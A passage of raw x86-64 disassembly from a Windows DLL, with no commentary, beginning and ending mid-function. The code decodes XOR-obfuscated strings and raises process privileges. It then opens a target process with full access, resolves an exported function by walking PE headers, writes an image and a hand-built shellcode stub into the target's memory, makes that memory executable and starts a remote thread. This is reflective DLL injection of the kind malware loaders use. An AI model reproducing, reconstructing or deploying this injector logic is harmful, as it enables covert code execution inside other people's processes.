   1800017a3:	e8 ad 1d 00 00       	call   0x180003555
   1800017a8:	48 8b cb             	mov    %rbx,%rcx
   1800017ab:	8a 84 39 f0 60 00 00 	mov    0x60f0(%rcx,%rdi,1),%al
   1800017b2:	34 dd                	xor    $0xdd,%al
   1800017b4:	88 44 0c 40          	mov    %al,0x40(%rsp,%rcx,1)
   1800017b8:	48 ff c1             	inc    %rcx
   1800017bb:	48 83 f9 64          	cmp    $0x64,%rcx
   1800017bf:	7c ea                	jl     0x1800017ab
   1800017c1:	41 bc 00 01 00 00    	mov    $0x100,%r12d
   1800017c7:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800017cb:	45 8b c4             	mov    %r12d,%r8d
   1800017ce:	33 d2                	xor    %edx,%edx
   1800017d0:	e8 80 1d 00 00       	call   0x180003555
   1800017d5:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1800017da:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1800017de:	48 ff c7             	inc    %rdi
   1800017e1:	38 1c 38             	cmp    %bl,(%rax,%rdi,1)
   1800017e4:	75 f8                	jne    0x1800017de
   1800017e6:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1800017eb:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   1800017f2:	00 
   1800017f3:	44 8b c7             	mov    %edi,%r8d
   1800017f6:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800017fb:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800017ff:	e8 fc f7 ff ff       	call   0x180001000
   180001804:	8a 44 24 33          	mov    0x33(%rsp),%al
   180001808:	88 05 7a 6f 00 00    	mov    %al,0x6f7a(%rip)        # 0x180008788
   18000180e:	8a 44 24 32          	mov    0x32(%rsp),%al
   180001812:	88 05 71 6f 00 00    	mov    %al,0x6f71(%rip)        # 0x180008789
   180001818:	8a 44 24 31          	mov    0x31(%rsp),%al
   18000181c:	88 05 68 6f 00 00    	mov    %al,0x6f68(%rip)        # 0x18000878a
   180001822:	8a 44 24 30          	mov    0x30(%rsp),%al
   180001826:	88 05 5f 6f 00 00    	mov    %al,0x6f5f(%rip)        # 0x18000878b
   18000182c:	48 63 05 55 6f 00 00 	movslq 0x6f55(%rip),%rax        # 0x180008788
   180001833:	49 89 06             	mov    %rax,(%r14)
   180001836:	48 85 c0             	test   %rax,%rax
   180001839:	74 33                	je     0x18000186e
   18000183b:	45 33 c0             	xor    %r8d,%r8d
   18000183e:	48 8b ce             	mov    %rsi,%rcx
   180001841:	41 8d 50 04          	lea    0x4(%r8),%edx
   180001845:	ff 15 2d 29 00 00    	call   *0x292d(%rip)        # 0x180004178
   18000184b:	49 8b 0e             	mov    (%r14),%rcx
   18000184e:	48 ff c1             	inc    %rcx
   180001851:	ff 15 b9 28 00 00    	call   *0x28b9(%rip)        # 0x180004110
   180001857:	4d 8b 06             	mov    (%r14),%r8
   18000185a:	4c 8b ce             	mov    %rsi,%r9
   18000185d:	48 8b c8             	mov    %rax,%rcx
   180001860:	ba 01 00 00 00       	mov    $0x1,%edx
   180001865:	48 8b d8             	mov    %rax,%rbx
   180001868:	ff 15 fa 28 00 00    	call   *0x28fa(%rip)        # 0x180004168
   18000186e:	4d 8b c4             	mov    %r12,%r8
   180001871:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   180001875:	33 d2                	xor    %edx,%edx
   180001877:	e8 d9 1c 00 00       	call   0x180003555
   18000187c:	41 8b 0e             	mov    (%r14),%ecx
   18000187f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180001884:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   180001888:	4c 8b cb             	mov    %rbx,%r9
   18000188b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   18000188f:	44 8b c7             	mov    %edi,%r8d
   180001892:	e8 69 f7 ff ff       	call   0x180001000
   180001897:	49 8b 16             	mov    (%r14),%rdx
   18000189a:	4c 8d 4c 24 34       	lea    0x34(%rsp),%r9
   18000189f:	48 ff c2             	inc    %rdx
   1800018a2:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1800018a8:	48 8b cb             	mov    %rbx,%rcx
   1800018ab:	ff 15 4f 27 00 00    	call   *0x274f(%rip)        # 0x180004000
   1800018b1:	48 8b ce             	mov    %rsi,%rcx
   1800018b4:	ff 15 c6 28 00 00    	call   *0x28c6(%rip)        # 0x180004180
   1800018ba:	48 8b c3             	mov    %rbx,%rax
   1800018bd:	48 8b 8d 20 01 00 00 	mov    0x120(%rbp),%rcx
   1800018c4:	48 33 cc             	xor    %rsp,%rcx
   1800018c7:	e8 a4 0d 00 00       	call   0x180002670
   1800018cc:	4c 8d 9c 24 30 02 00 	lea    0x230(%rsp),%r11
   1800018d3:	00 
   1800018d4:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1800018d8:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1800018dc:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   1800018e0:	49 8b e3             	mov    %r11,%rsp
   1800018e3:	41 5e                	pop    %r14
   1800018e5:	41 5c                	pop    %r12
   1800018e7:	5d                   	pop    %rbp
   1800018e8:	c3                   	ret
   1800018e9:	cc                   	int3
   1800018ea:	cc                   	int3
   1800018eb:	cc                   	int3
   1800018ec:	48 8b c4             	mov    %rsp,%rax
   1800018ef:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1800018f3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800018f7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800018fb:	55                   	push   %rbp
   1800018fc:	41 56                	push   %r14
   1800018fe:	41 57                	push   %r15
   180001900:	48 8d 68 a8          	lea    -0x58(%rax),%rbp
   180001904:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   18000190b:	48 8b 05 ee 46 00 00 	mov    0x46ee(%rip),%rax        # 0x180006000
   180001912:	48 33 c4             	xor    %rsp,%rax
   180001915:	48 89 45 30          	mov    %rax,0x30(%rbp)
   180001919:	48 8b f1             	mov    %rcx,%rsi
   18000191c:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   180001923:	00 
   180001924:	45 33 ff             	xor    %r15d,%r15d
   180001927:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000192c:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   180001931:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   180001936:	e8 a9 fd ff ff       	call   0x1800016e4
   18000193b:	48 8b d8             	mov    %rax,%rbx
   18000193e:	48 85 c0             	test   %rax,%rax
   180001941:	0f 84 6d 01 00 00    	je     0x180001ab4
   180001947:	4c 8b 74 24 40       	mov    0x40(%rsp),%r14
   18000194c:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   180001950:	ff 15 ba 27 00 00    	call   *0x27ba(%rip)        # 0x180004110
   180001956:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   18000195b:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   180001960:	ff 15 a2 26 00 00    	call   *0x26a2(%rip)        # 0x180004008
   180001966:	48 8b c8             	mov    %rax,%rcx
   180001969:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   18000196e:	41 8d 57 28          	lea    0x28(%r15),%edx
   180001972:	ff 15 90 4e 00 00    	call   *0x4e90(%rip)        # 0x180006808
   180001978:	85 c0                	test   %eax,%eax
   18000197a:	0f 84 34 01 00 00    	je     0x180001ab4
   180001980:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180001985:	33 c9                	xor    %ecx,%ecx
   180001987:	48 8d 15 72 29 00 00 	lea    0x2972(%rip),%rdx        # 0x180004300
   18000198e:	ff 15 6c 4e 00 00    	call   *0x4e6c(%rip)        # 0x180006800
   180001994:	85 c0                	test   %eax,%eax
   180001996:	0f 84 18 01 00 00    	je     0x180001ab4
   18000199c:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800019a1:	45 8d 4f 10          	lea    0x10(%r15),%r9d
   1800019a5:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1800019aa:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   1800019ae:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   1800019b3:	33 d2                	xor    %edx,%edx
   1800019b5:	48 89 45 a4          	mov    %rax,-0x5c(%rbp)
   1800019b9:	c7 45 a0 01 00 00 00 	movl   $0x1,-0x60(%rbp)
   1800019c0:	c7 45 ac 02 00 00 00 	movl   $0x2,-0x54(%rbp)
   1800019c7:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1800019cc:	ff 15 46 4e 00 00    	call   *0x4e46(%rip)        # 0x180006818
   1800019d2:	85 c0                	test   %eax,%eax
   1800019d4:	0f 84 da 00 00 00    	je     0x180001ab4
   1800019da:	33 d2                	xor    %edx,%edx
   1800019dc:	44 88 7d c0          	mov    %r15b,-0x40(%rbp)
   1800019e0:	45 8d 47 63          	lea    0x63(%r15),%r8d
   1800019e4:	48 8d 4d c1          	lea    -0x3f(%rbp),%rcx
   1800019e8:	e8 68 1b 00 00       	call   0x180003555
   1800019ed:	41 8b cf             	mov    %r15d,%ecx
   1800019f0:	48 8d 05 61 47 00 00 	lea    0x4761(%rip),%rax        # 0x180006158
   1800019f7:	8a 04 01             	mov    (%rcx,%rax,1),%al
   1800019fa:	34 dd                	xor    $0xdd,%al
   1800019fc:	88 44 0d c0          	mov    %al,-0x40(%rbp,%rcx,1)
   180001a00:	48 ff c1             	inc    %rcx
   180001a03:	48 83 f9 0d          	cmp    $0xd,%rcx
   180001a07:	7c e7                	jl     0x1800019f0
   180001a09:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180001a0d:	e8 0a fc ff ff       	call   0x18000161c
   180001a12:	8b f8                	mov    %eax,%edi
   180001a14:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   180001a19:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001a1c:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   180001a21:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   180001a26:	c7 44 24 70 30 00 00 	movl   $0x30,0x70(%rsp)
   180001a2d:	00 
   180001a2e:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   180001a33:	4c 89 7c 24 78       	mov    %r15,0x78(%rsp)
   180001a38:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   180001a3d:	44 89 7d 88          	mov    %r15d,-0x78(%rbp)
   180001a41:	f3 0f 7f 45 90       	movdqu %xmm0,-0x70(%rbp)
   180001a46:	4c 89 7d 80          	mov    %r15,-0x80(%rbp)
   180001a4a:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   180001a4f:	e8 cc 0a 00 00       	call   0x180002520
   180001a54:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180001a59:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   180001a5d:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   180001a61:	77 51                	ja     0x180001ab4
   180001a63:	33 c0                	xor    %eax,%eax
   180001a65:	44 88 7d b0          	mov    %r15b,-0x50(%rbp)
   180001a69:	48 89 45 b1          	mov    %rax,-0x4f(%rbp)
   180001a6d:	45 8b c6             	mov    %r14d,%r8d
   180001a70:	88 45 b9             	mov    %al,-0x47(%rbp)
   180001a73:	48 8b d3             	mov    %rbx,%rdx
   180001a76:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   180001a7a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180001a7f:	e8 d0 01 00 00       	call   0x180001c54
   180001a84:	48 8b d8             	mov    %rax,%rbx
   180001a87:	48 85 c0             	test   %rax,%rax
   180001a8a:	74 28                	je     0x180001ab4
   180001a8c:	45 33 c0             	xor    %r8d,%r8d
   180001a8f:	33 d2                	xor    %edx,%edx
   180001a91:	48 8b c8             	mov    %rax,%rcx
   180001a94:	e8 87 0b 00 00       	call   0x180002620
   180001a99:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   180001a9e:	48 8b cb             	mov    %rbx,%rcx
   180001aa1:	ff 15 69 25 00 00    	call   *0x2569(%rip)        # 0x180004010
   180001aa7:	85 c0                	test   %eax,%eax
   180001aa9:	74 09                	je     0x180001ab4
   180001aab:	89 3e                	mov    %edi,(%rsi)
   180001aad:	b8 01 00 00 00       	mov    $0x1,%eax
   180001ab2:	eb 02                	jmp    0x180001ab6
   180001ab4:	33 c0                	xor    %eax,%eax
   180001ab6:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   180001aba:	48 33 cc             	xor    %rsp,%rcx
   180001abd:	e8 ae 0b 00 00       	call   0x180002670
   180001ac2:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   180001ac9:	00 
   180001aca:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180001ace:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180001ad2:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   180001ad6:	49 8b e3             	mov    %r11,%rsp
   180001ad9:	41 5f                	pop    %r15
   180001adb:	41 5e                	pop    %r14
   180001add:	5d                   	pop    %rbp
   180001ade:	c3                   	ret
   180001adf:	cc                   	int3
   180001ae0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001ae5:	44 8b c1             	mov    %ecx,%r8d
   180001ae8:	b8 0b 01 00 00       	mov    $0x10b,%eax
   180001aed:	48 63 4a 3c          	movslq 0x3c(%rdx),%rcx
   180001af1:	48 03 ca             	add    %rdx,%rcx
   180001af4:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001af8:	74 0b                	je     0x180001b05
   180001afa:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180001aff:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001b03:	75 49                	jne    0x180001b4e
   180001b05:	0f b7 59 06          	movzwl 0x6(%rcx),%ebx
   180001b09:	b8 14 00 00 00       	mov    $0x14,%eax
   180001b0e:	48 8b d1             	mov    %rcx,%rdx
   180001b11:	44 0f b7 0c 08       	movzwl (%rax,%rcx,1),%r9d
   180001b16:	4c 03 c9             	add    %rcx,%r9
   180001b19:	45 3b 41 2c          	cmp    0x2c(%r9),%r8d
   180001b1d:	73 05                	jae    0x180001b24
   180001b1f:	41 8b c0             	mov    %r8d,%eax
   180001b22:	eb 2c                	jmp    0x180001b50
   180001b24:	33 d2                	xor    %edx,%edx
   180001b26:	eb 21                	jmp    0x180001b49
   180001b28:	0f b7 c2             	movzwl %dx,%eax
   180001b2b:	4c 8d 14 80          	lea    (%rax,%rax,4),%r10
   180001b2f:	47 8b 5c d1 24       	mov    0x24(%r9,%r10,8),%r11d
   180001b34:	45 3b c3             	cmp    %r11d,%r8d
   180001b37:	72 0d                	jb     0x180001b46
   180001b39:	43 8b 4c d1 28       	mov    0x28(%r9,%r10,8),%ecx
   180001b3e:	41 03 cb             	add    %r11d,%ecx
   180001b41:	44 3b c1             	cmp    %ecx,%r8d
   180001b44:	72 10                	jb     0x180001b56
   180001b46:	66 ff c2             	inc    %dx
   180001b49:	66 3b d3             	cmp    %bx,%dx
   180001b4c:	72 da                	jb     0x180001b28
   180001b4e:	33 c0                	xor    %eax,%eax
   180001b50:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180001b55:	c3                   	ret
   180001b56:	43 8b 44 d1 2c       	mov    0x2c(%r9,%r10,8),%eax
   180001b5b:	41 2b c3             	sub    %r11d,%eax
   180001b5e:	41 03 c0             	add    %r8d,%eax
   180001b61:	eb ed                	jmp    0x180001b50
   180001b63:	cc                   	int3
   180001b64:	48 8b c4             	mov    %rsp,%rax
   180001b67:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180001b6b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180001b6f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180001b73:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180001b77:	41 56                	push   %r14
   180001b79:	48 83 ec 20          	sub    $0x20,%rsp
   180001b7d:	48 8b d9             	mov    %rcx,%rbx
   180001b80:	b8 0b 01 00 00       	mov    $0x10b,%eax
   180001b85:	48 63 49 3c          	movslq 0x3c(%rcx),%rcx
   180001b89:	48 03 cb             	add    %rbx,%rcx
   180001b8c:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001b90:	75 07                	jne    0x180001b99
   180001b92:	b8 78 00 00 00       	mov    $0x78,%eax
   180001b97:	eb 10                	jmp    0x180001ba9
   180001b99:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180001b9e:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001ba2:	75 6d                	jne    0x180001c11
   180001ba4:	b8 88 00 00 00       	mov    $0x88,%eax
   180001ba9:	8b 0c 08             	mov    (%rax,%rcx,1),%ecx
   180001bac:	48 8b d3             	mov    %rbx,%rdx
   180001baf:	e8 2c ff ff ff       	call   0x180001ae0
   180001bb4:	44 8b f0             	mov    %eax,%r14d
   180001bb7:	48 8b d3             	mov    %rbx,%rdx
   180001bba:	4c 03 f3             	add    %rbx,%r14
   180001bbd:	41 8b 4e 20          	mov    0x20(%r14),%ecx
   180001bc1:	e8 1a ff ff ff       	call   0x180001ae0
   180001bc6:	41 8b 4e 24          	mov    0x24(%r14),%ecx
   180001bca:	48 8b d3             	mov    %rbx,%rdx
   180001bcd:	8b f8                	mov    %eax,%edi
   180001bcf:	48 03 fb             	add    %rbx,%rdi
   180001bd2:	e8 09 ff ff ff       	call   0x180001ae0
   180001bd7:	41 8b 6e 18          	mov    0x18(%r14),%ebp
   180001bdb:	8b f0                	mov    %eax,%esi
   180001bdd:	48 03 f3             	add    %rbx,%rsi
   180001be0:	eb 2b                	jmp    0x180001c0d
   180001be2:	8b 0f                	mov    (%rdi),%ecx
   180001be4:	48 8b d3             	mov    %rbx,%rdx
   180001be7:	ff cd                	dec    %ebp
   180001be9:	e8 f2 fe ff ff       	call   0x180001ae0
   180001bee:	8b c8                	mov    %eax,%ecx
   180001bf0:	48 8d 15 21 27 00 00 	lea    0x2721(%rip),%rdx        # 0x180004318
   180001bf7:	48 03 cb             	add    %rbx,%rcx
   180001bfa:	ff 15 c0 24 00 00    	call   *0x24c0(%rip)        # 0x1800040c0
   180001c00:	48 85 c0             	test   %rax,%rax
   180001c03:	75 29                	jne    0x180001c2e
   180001c05:	48 83 c7 04          	add    $0x4,%rdi
   180001c09:	48 83 c6 02          	add    $0x2,%rsi
   180001c0d:	85 ed                	test   %ebp,%ebp
   180001c0f:	75 d1                	jne    0x180001be2
   180001c11:	33 c0                	xor    %eax,%eax
   180001c13:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001c18:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180001c1d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180001c22:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180001c27:	48 83 c4 20          	add    $0x20,%rsp
   180001c2b:	41 5e                	pop    %r14
   180001c2d:	c3                   	ret
   180001c2e:	41 8b 4e 1c          	mov    0x1c(%r14),%ecx
   180001c32:	48 8b d3             	mov    %rbx,%rdx
   180001c35:	e8 a6 fe ff ff       	call   0x180001ae0
   180001c3a:	44 0f b7 06          	movzwl (%rsi),%r8d
   180001c3e:	48 8b d3             	mov    %rbx,%rdx
   180001c41:	8b c8                	mov    %eax,%ecx
   180001c43:	48 03 cb             	add    %rbx,%rcx
   180001c46:	42 8b 0c 81          	mov    (%rcx,%r8,4),%ecx
   180001c4a:	e8 91 fe ff ff       	call   0x180001ae0
   180001c4f:	eb c2                	jmp    0x180001c13
   180001c51:	cc                   	int3
   180001c52:	cc                   	int3
   180001c53:	cc                   	int3
   180001c54:	40 53                	rex push %rbx
   180001c56:	56                   	push   %rsi
   180001c57:	57                   	push   %rdi
   180001c58:	41 54                	push   %r12
   180001c5a:	41 55                	push   %r13
   180001c5c:	41 56                	push   %r14
   180001c5e:	41 57                	push   %r15
   180001c60:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   180001c67:	48 8b 05 92 43 00 00 	mov    0x4392(%rip),%rax        # 0x180006000
   180001c6e:	48 33 c4             	xor    %rsp,%rax
   180001c71:	48 89 84 24 00 01 00 	mov    %rax,0x100(%rsp)
   180001c78:	00 
   180001c79:	41 8b f0             	mov    %r8d,%esi
   180001c7c:	48 8b fa             	mov    %rdx,%rdi
   180001c7f:	48 8b d9             	mov    %rcx,%rbx
   180001c82:	4c 8b a4 24 78 01 00 	mov    0x178(%rsp),%r12
   180001c89:	00 
   180001c8a:	45 33 ed             	xor    %r13d,%r13d
   180001c8d:	4c 89 6c 24 68       	mov    %r13,0x68(%rsp)
   180001c92:	48 85 c9             	test   %rcx,%rcx
   180001c95:	0f 84 49 02 00 00    	je     0x180001ee4
   180001c9b:	48 85 d2             	test   %rdx,%rdx
   180001c9e:	0f 84 40 02 00 00    	je     0x180001ee4
   180001ca4:	45 85 c0             	test   %r8d,%r8d
   180001ca7:	0f 84 37 02 00 00    	je     0x180001ee4
   180001cad:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   180001cb1:	0f b7 54 10 18       	movzwl 0x18(%rax,%rdx,1),%edx
   180001cb6:	b8 0b 01 00 00       	mov    $0x10b,%eax
   180001cbb:	41 8d 4d 02          	lea    0x2(%r13),%ecx
   180001cbf:	66 3b d0             	cmp    %ax,%dx
   180001cc2:	75 05                	jne    0x180001cc9
   180001cc4:	8d 41 ff             	lea    -0x1(%rcx),%eax
   180001cc7:	eb 10                	jmp    0x180001cd9
   180001cc9:	41 8b c5             	mov    %r13d,%eax
   180001ccc:	41 b8 0b 02 00 00    	mov    $0x20b,%r8d
   180001cd2:	66 41 3b d0          	cmp    %r8w,%dx
   180001cd6:	0f 44 c1             	cmove  %ecx,%eax
   180001cd9:	3b c1                	cmp    %ecx,%eax
   180001cdb:	0f 85 03 02 00 00    	jne    0x180001ee4
   180001ce1:	48 8b cf             	mov    %rdi,%rcx
   180001ce4:	e8 7b fe ff ff       	call   0x180001b64
   180001ce9:	44 8b f0             	mov    %eax,%r14d
   180001cec:	85 c0                	test   %eax,%eax
   180001cee:	0f 84 f0 01 00 00    	je     0x180001ee4
   180001cf4:	8d 56 40             	lea    0x40(%rsi),%edx
   180001cf7:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   180001cfc:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   180001d01:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180001d08:	00 
   180001d09:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   180001d10:	00 
   180001d11:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   180001d16:	45 33 c0             	xor    %r8d,%r8d
   180001d19:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180001d1e:	48 8b cb             	mov    %rbx,%rcx
   180001d21:	e8 3a 08 00 00       	call   0x180002560
   180001d26:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180001d2b:	48 85 d2             	test   %rdx,%rdx
   180001d2e:	0f 84 b0 01 00 00    	je     0x180001ee4
   180001d34:	4c 8b fe             	mov    %rsi,%r15
   180001d37:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180001d3c:	4c 8b ce             	mov    %rsi,%r9
   180001d3f:	4c 8b c7             	mov    %rdi,%r8
   180001d42:	48 8b cb             	mov    %rbx,%rcx
   180001d45:	e8 96 07 00 00       	call   0x1800024e0
   180001d4a:	85 c0                	test   %eax,%eax
   180001d4c:	0f 85 92 01 00 00    	jne    0x180001ee4
   180001d52:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180001d57:	4a 8d 34 30          	lea    (%rax,%r14,1),%rsi
   180001d5b:	49 8d 3c 07          	lea    (%r15,%rax,1),%rdi
   180001d5f:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   180001d66:	00 
   180001d67:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180001d6c:	45 33 c9             	xor    %r9d,%r9d
   180001d6f:	4d 8b c4             	mov    %r12,%r8
   180001d72:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
   180001d79:	00 
   180001d7a:	48 8b cb             	mov    %rbx,%rcx
   180001d7d:	e8 5e 07 00 00       	call   0x1800024e0
   180001d82:	85 c0                	test   %eax,%eax
   180001d84:	0f 85 5a 01 00 00    	jne    0x180001ee4
   180001d8a:	44 88 ac 24 e4 00 00 	mov    %r13b,0xe4(%rsp)
   180001d91:	00 
   180001d92:	4c 89 ac 24 f7 00 00 	mov    %r13,0xf7(%rsp)
   180001d99:	00 
   180001d9a:	44 88 ac 24 ff 00 00 	mov    %r13b,0xff(%rsp)
   180001da1:	00 
   180001da2:	48 89 b4 24 98 00 00 	mov    %rsi,0x98(%rsp)
   180001da9:	00 
   180001daa:	44 89 6c 24 78       	mov    %r13d,0x78(%rsp)
   180001daf:	48 89 bc 24 a0 00 00 	mov    %rdi,0xa0(%rsp)
   180001db6:	00 
   180001db7:	ba ab 5e 9b 1e       	mov    $0x1e9b5eab,%edx
   180001dbc:	89 94 24 80 00 00 00 	mov    %edx,0x80(%rsp)
   180001dc3:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180001dc8:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   180001dcf:	00 
   180001dd0:	4c 89 ac 24 b0 00 00 	mov    %r13,0xb0(%rsp)
   180001dd7:	00 
   180001dd8:	b9 48 b9 00 00       	mov    $0xb948,%ecx
   180001ddd:	66 89 8c 24 c0 00 00 	mov    %cx,0xc0(%rsp)
   180001de4:	00 
   180001de5:	4c 89 ac 24 c2 00 00 	mov    %r13,0xc2(%rsp)
   180001dec:	00 
   180001ded:	b9 48 ba 00 00       	mov    $0xba48,%ecx
   180001df2:	66 89 8c 24 ca 00 00 	mov    %cx,0xca(%rsp)
   180001df9:	00 
   180001dfa:	48 89 84 24 cc 00 00 	mov    %rax,0xcc(%rsp)
   180001e01:	00 
   180001e02:	b8 41 b8 00 00       	mov    $0xb841,%eax
   180001e07:	66 89 84 24 d4 00 00 	mov    %ax,0xd4(%rsp)
   180001e0e:	00 
   180001e0f:	89 94 24 d6 00 00 00 	mov    %edx,0xd6(%rsp)
   180001e16:	b8 49 b9 00 00       	mov    $0xb949,%eax
   180001e1b:	66 89 84 24 da 00 00 	mov    %ax,0xda(%rsp)
   180001e22:	00 
   180001e23:	48 89 bc 24 dc 00 00 	mov    %rdi,0xdc(%rsp)
   180001e2a:	00 
   180001e2b:	c6 84 24 e4 00 00 00 	movb   $0x68,0xe4(%rsp)
   180001e32:	68 
   180001e33:	44 89 ac 24 e5 00 00 	mov    %r13d,0xe5(%rsp)
   180001e3a:	00 
   180001e3b:	c7 84 24 e9 00 00 00 	movl   $0x20ec8348,0xe9(%rsp)
   180001e42:	48 83 ec 20 
   180001e46:	b8 48 b8 00 00       	mov    $0xb848,%eax
   180001e4b:	66 89 84 24 ed 00 00 	mov    %ax,0xed(%rsp)
   180001e52:	00 
   180001e53:	48 89 b4 24 ef 00 00 	mov    %rsi,0xef(%rsp)
   180001e5a:	00 
   180001e5b:	66 c7 84 24 f7 00 00 	movw   $0xd0ff,0xf7(%rsp)
   180001e62:	00 ff d0 
   180001e65:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180001e6a:	41 b9 39 00 00 00    	mov    $0x39,%r9d
   180001e70:	4c 8d 84 24 c0 00 00 	lea    0xc0(%rsp),%r8
   180001e77:	00 
   180001e78:	48 8b d7             	mov    %rdi,%rdx
   180001e7b:	48 8b cb             	mov    %rbx,%rcx
   180001e7e:	e8 5d 06 00 00       	call   0x1800024e0
   180001e83:	85 c0                	test   %eax,%eax
   180001e85:	75 5d                	jne    0x180001ee4
   180001e87:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   180001e8e:	00 
   180001e8f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001e94:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   180001e9a:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   180001e9f:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180001ea4:	48 8b cb             	mov    %rbx,%rcx
   180001ea7:	e8 f4 05 00 00       	call   0x1800024a0
   180001eac:	4c 89 6c 24 50       	mov    %r13,0x50(%rsp)
   180001eb1:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
   180001eb6:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   180001ebb:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   180001ec0:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   180001ec5:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   180001eca:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180001ecf:	4c 8b cb             	mov    %rbx,%r9
   180001ed2:	45 33 c0             	xor    %r8d,%r8d
   180001ed5:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   180001eda:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180001edf:	e8 bc 06 00 00       	call   0x1800025a0
   180001ee4:	eb 06                	jmp    0x180001eec
   180001ee6:	48 83 64 24 68 00    	andq   $0x0,0x68(%rsp)
   180001eec:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180001ef1:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   180001ef8:	00 
   180001ef9:	48 33 cc             	xor    %rsp,%rcx
   180001efc:	e8 6f 07 00 00       	call   0x180002670
   180001f01:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
   180001f08:	41 5f                	pop    %r15
